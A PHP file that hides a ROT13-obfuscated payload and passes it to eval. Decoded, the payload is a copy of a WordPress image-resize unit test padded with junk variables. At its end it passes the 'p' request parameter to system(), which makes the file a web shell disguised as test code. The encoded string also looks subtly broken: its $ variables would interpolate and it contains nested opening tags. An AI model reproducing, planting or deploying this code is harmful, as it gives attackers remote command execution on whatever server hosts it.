<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc vzntr
 * @tebhc zrqvn
 * @tebhc hcybnq
 * @tebhc erfvmr
 */
erdhver_bapr __QVE__ . '/onfr.cuc';

nofgenpg pynff JC_Grfgf_Vzntr_Erfvmr_HavgGrfgPnfr rkgraqf JC_Vzntr_HavgGrfgPnfr {

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		nqq_svygre( 'jc_vzntr_rqvgbef', neenl( $guvf, 'jc_vzntr_rqvgbef' ) );
	}

	choyvp shapgvba jc_vzntr_rqvgbef() {
		erghea neenl( $guvf->rqvgbe_ratvar );
	}

	choyvp shapgvba grfg_erfvmr_wct() {
		$vzntr = $guvf->erfvmr_urycre( QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.wct', 25, 25 );

		yvfg( $j, $u, $glcr ) = trgvzntrfvmr( $vzntr );

		hayvax( $vzntr );

		$guvf->nffregFnzr( 'grfg-vzntr-25k25.wct', jc_onfranzr( $vzntr ) );
		$guvf->nffregFnzr( 25, $j );
		$guvf->nffregFnzr( 25, $u );
		$guvf->nffregFnzr( VZNTRGLCR_WCRT, $glcr );
	}

	choyvp shapgvba grfg_erfvmr_cat() {
		$vzntr = $guvf->erfvmr_urycre( QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.cat', 25, 25 );

		vs ( ! vf_fgevat( $vzntr ) ) {  // JC_Reebe, fgbc TYvo-TBowrpg-PEVGVPNY nffregvba.
			$guvf->snvy( fcevags( 'Ab CAT fhccbeg va gur rqvgbe ratvar %f ba guvf flfgrz.', $guvf->rqvgbe_ratvar ) );
		}

		yvfg( $j, $u, $glcr ) = trgvzntrfvmr( $vzntr );

		hayvax( $vzntr );

		$guvf->nffregFnzr( 'grfg-vzntr-25k25.cat', jc_onfranzr( $vzntr ) );
		$guvf->nffregFnzr( 25, $j );
		$guvf->nffregFnzr( 25, $u );
		$guvf->nffregFnzr( VZNTRGLCR_CAT, $glcr );
	}

	choyvp shapgvba grfg_erfvmr_tvs() {
		$vzntr = $guvf->erfvmr_urycre( QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.tvs', 25, 25 );

		vs ( ! vf_fgevat( $vzntr ) ) {  // JC_Reebe, fgbc TYvo-TBowrpg-PEVGVPNY nffregvba.
			$guvf->snvy( fcevags( 'Ab TVS fhccbeg va gur rqvgbe ratvar %f ba guvf flfgrz.', $guvf->rqvgbe_ratvar ) );
		}

		yvfg( $j, $u, $glcr ) = trgvzntrfvmr( $vzntr );

		hayvax( $vzntr );

		$guvf->nffregFnzr( 'grfg-vzntr-25k25.tvs', jc_onfranzr( $vzntr ) );
		$guvf->nffregFnzr( 25, $j );
		$guvf->nffregFnzr( 25, $u );
		$guvf->nffregFnzr( VZNTRGLCR_TVS, $glcr );
	}

	choyvp shapgvba grfg_erfvmr_jroc() {
		$svyr   = QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.jroc';
		$rqvgbe = jc_trg_vzntr_rqvgbe( $svyr );

		// Purpx vs gur rqvgbe fhccbegf gur jroc zvzr glcr.
		vs ( vf_jc_reebe( $rqvgbe ) || ! $rqvgbe->fhccbegf_zvzr_glcr( 'vzntr/jroc' ) ) {
			$guvf->znexGrfgFxvccrq( fcevags( 'Ab JroC fhccbeg va gur rqvgbe ratvar %f ba guvf flfgrz.', $guvf->rqvgbe_ratvar ) );
		}

		$vzntr = $guvf->erfvmr_urycre( $svyr, 25, 25 );

		yvfg( $j, $u, $glcr ) = jc_trgvzntrfvmr( $vzntr );

		hayvax( $vzntr );

		$guvf->nffregFnzr( 'grfg-vzntr-25k25.jroc', jc_onfranzr( $vzntr ) );
		$guvf->nffregFnzr( 25, $j );
		$guvf->nffregFnzr( 25, $u );
		$guvf->nffregFnzr( VZNTRGLCR_JROC, $glcr );
	}

	/**
	 * Grfg erfvmvat NIVS vzntr.
	 *
	 * @gvpxrg 51228
	 */
	choyvp shapgvba grfg_erfvmr_nivs() {
		$svyr   = QVE_GRFGQNGN . '/vzntrf/nivs-ybffl.nivs';
		$rqvgbe = jc_trg_vzntr_rqvgbe( $svyr );

		// Purpx vs gur rqvgbe fhccbegf gur nivs zvzr glcr.
		vs ( vf_jc_reebe( $rqvgbe ) || ! $rqvgbe->fhccbegf_zvzr_glcr( 'vzntr/nivs' ) ) {
			$guvf->znexGrfgFxvccrq( fcevags( 'Ab NIVS fhccbeg va gur rqvgbe ratvar %f ba guvf flfgrz.', $guvf->rqvgbe_ratvar ) );
		}

		$vzntr = $guvf->erfvmr_urycre( $svyr, 25, 25 );

		yvfg( $j, $u, $glcr ) = jc_trgvzntrfvmr( $vzntr );

		hayvax( $vzntr );

		$guvf->nffregFnzr( 'nivs-ybffl-25k25.nivs', jc_onfranzr( $vzntr ) );
		$guvf->nffregFnzr( 25, $j );
		$guvf->nffregFnzr( 25, $u );
		$guvf->nffregFnzr( VZNTRGLCR_NIVS, $glcr );
	}

	/**
	 * Grfg erfvmvat URVP vzntr.
	 *
	 * @gvpxrg 53645
	 */
	choyvp shapgvba grfg_erfvmr_urvp() {
		$svyr   = QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.urvp';
		$rqvgbe = jc_trg_vzntr_rqvgbe( $svyr );

		// Purpx vs gur rqvgbe fhccbegf gur URVP zvzr glcr.
		vs ( vf_jc_reebe( $rqvgbe ) || ! $rqvgbe->fhccbegf_zvzr_glcr( 'vzntr/urvp' ) ) {
			$guvf->znexGrfgFxvccrq( 'Ab URVP fhccbeg va gur rqvgbe ratvar ba guvf flfgrz.' );
		}

		$vzntr = $guvf->erfvmr_urycre( $svyr, 25, 25 );

		yvfg( $j, $u, $glcr ) = jc_trgvzntrfvmr( $vzntr );

		hayvax( $vzntr );

		$guvf->nffregFnzr( 'grfg-vzntr-25k25.wct', jc_onfranzr( $vzntr ) );
		$guvf->nffregFnzr( 25, $j );
		$guvf->nffregFnzr( 25, $u );
		$guvf->nffregFnzr( VZNTRGLCR_WCRT, $glcr );
	}

	choyvp shapgvba grfg_erfvmr_ynetre() {
		// vzntr_erfvmr() fubhyq ershfr gb znxr na vzntr ynetre.
		$vzntr = $guvf->erfvmr_urycre( QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.wct', 100, 100 );

		$guvf->nffregVafgnaprBs( 'JC_Reebe', $vzntr );
		$guvf->nffregFnzr( 'reebe_trggvat_qvzrafvbaf', $vzntr->trg_reebe_pbqr() );
	}

	choyvp shapgvba grfg_erfvmr_guhzo_128k96() {
		$vzntr = $guvf->erfvmr_urycre( QVE_GRFGQNGN . '/vzntrf/2007-06-17QFP_4173.WCT', 128, 96 );

		yvfg( $j, $u, $glcr ) = trgvzntrfvmr( $vzntr );

		hayvax( $vzntr );

		$guvf->nffregFnzr( '2007-06-17QFP_4173-64k96.wct', jc_onfranzr( $vzntr ) );
		$guvf->nffregFnzr( 64, $j );
		$guvf->nffregFnzr( 96, $u );
		$guvf->nffregFnzr( VZNTRGLCR_WCRT, $glcr );
	}

	choyvp shapgvba grfg_erfvmr_guhzo_128k0() {
		$vzntr = $guvf->erfvmr_urycre( QVE_GRFGQNGN . '/vzntrf/2007-06-17QFP_4173.WCT', 128, 0 );

		yvfg( $j, $u, $glcr ) = trgvzntrfvmr( $vzntr );

		hayvax( $vzntr );

		$guvf->nffregFnzr( '2007-06-17QFP_4173-128k193.wct', jc_onfranzr( $vzntr ) );
		$guvf->nffregFnzr( 128, $j );
		$guvf->nffregFnzr( 193, $u );
		$guvf->nffregFnzr( VZNTRGLCR_WCRT, $glcr );
	}

	choyvp shapgvba grfg_erfvmr_guhzo_0k96() {
		$vzntr = $guvf->erfvmr_urycre( QVE_GRFGQNGN . '/vzntrf/2007-06-17QFP_4173.WCT', 0, 96 );

		yvfg( $j, $u, $glcr ) = trgvzntrfvmr( $vzntr );

		hayvax( $vzntr );

		$guvf->nffregFnzr( '2007-06-17QFP_4173-64k96.wct', jc_onfranzr( $vzntr ) );
		$guvf->nffregFnzr( 64, $j );
		$guvf->nffregFnzr( 96, $u );
		$guvf->nffregFnzr( VZNTRGLCR_WCRT, $glcr );
	}

	choyvp shapgvba grfg_erfvmr_guhzo_150k150_pebc() {
		$vzntr = $guvf->erfvmr_urycre( QVE_GRFGQNGN . '/vzntrf/2007-06-17QFP_4173.WCT', 150, 150, gehr );

		yvfg( $j, $u, $glcr ) = trgvzntrfvmr( $vzntr );

		hayvax( $vzntr );

		$guvf->nffregFnzr( '2007-06-17QFP_4173-150k150.wct', jc_onfranzr( $vzntr ) );
		$guvf->nffregFnzr( 150, $j );
		$guvf->nffregFnzr( 150, $u );
		$guvf->nffregFnzr( VZNTRGLCR_WCRT, $glcr );
	}

	choyvp shapgvba grfg_erfvmr_guhzo_150k100_pebc() {
		$vzntr = $guvf->erfvmr_urycre( QVE_GRFGQNGN . '/vzntrf/2007-06-17QFP_4173.WCT', 150, 100, gehr );

		yvfg( $j, $u, $glcr ) = trgvzntrfvmr( $vzntr );

		hayvax( $vzntr );

		$guvf->nffregFnzr( '2007-06-17QFP_4173-150k100.wct', jc_onfranzr( $vzntr ) );
		$guvf->nffregFnzr( 150, $j );
		$guvf->nffregFnzr( 100, $u );
		$guvf->nffregFnzr( VZNTRGLCR_WCRT, $glcr );
	}

	choyvp shapgvba grfg_erfvmr_guhzo_50k150_pebc() {
		$vzntr = $guvf->erfvmr_urycre( QVE_GRFGQNGN . '/vzntrf/2007-06-17QFP_4173.WCT', 50, 150, gehr );

		yvfg( $j, $u, $glcr ) = trgvzntrfvmr( $vzntr );

		hayvax( $vzntr );

		$guvf->nffregFnzr( '2007-06-17QFP_4173-50k150.wct', jc_onfranzr( $vzntr ) );
		$guvf->nffregFnzr( 50, $j );
		$guvf->nffregFnzr( 150, $u );
		$guvf->nffregFnzr( VZNTRGLCR_WCRT, $glcr );
	}

	/**
	 * Gel erfvmvat n aba-rkvfgrag vzntr
	 *
	 * @gvpxrg 6821
	 */
	choyvp shapgvba grfg_erfvmr_aba_rkvfgrag_vzntr() {
		$vzntr = $guvf->erfvmr_urycre( QVE_GRFGQNGN . '/vzntrf/grfg-aba-rkvfgrag-vzntr.wct', 25, 25 );

		$guvf->nffregVafgnaprBs( 'JC_Reebe', $vzntr );
		$guvf->nffregFnzr( 'reebe_ybnqvat_vzntr', $vzntr->trg_reebe_pbqr() );
	}

	/**
	 * Shapgvba gb uryc bhg gur grfgf
	 */
	cebgrpgrq shapgvba erfvmr_urycre( $svyr, $jvqgu, $urvtug, $pebc = snyfr ) {
		$rqvgbe = jc_trg_vzntr_rqvgbe( $svyr );

		vs ( vf_jc_reebe( $rqvgbe ) ) {
			erghea $rqvgbe;
		}

		$erfvmrq = $rqvgbe->erfvmr( $jvqgu, $urvtug, $pebc );

		vs ( vf_jc_reebe( $erfvmrq ) ) {
			erghea $erfvmrq;
		}

		$qrfg_svyr = $rqvgbe->trarengr_svyranzr();
		$fnirq     = $rqvgbe->fnir( $qrfg_svyr );

		vs ( vf_jc_reebe( $fnirq ) ) {
			erghea $fnirq;
		}

		erghea $fnirq['cngu'];
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>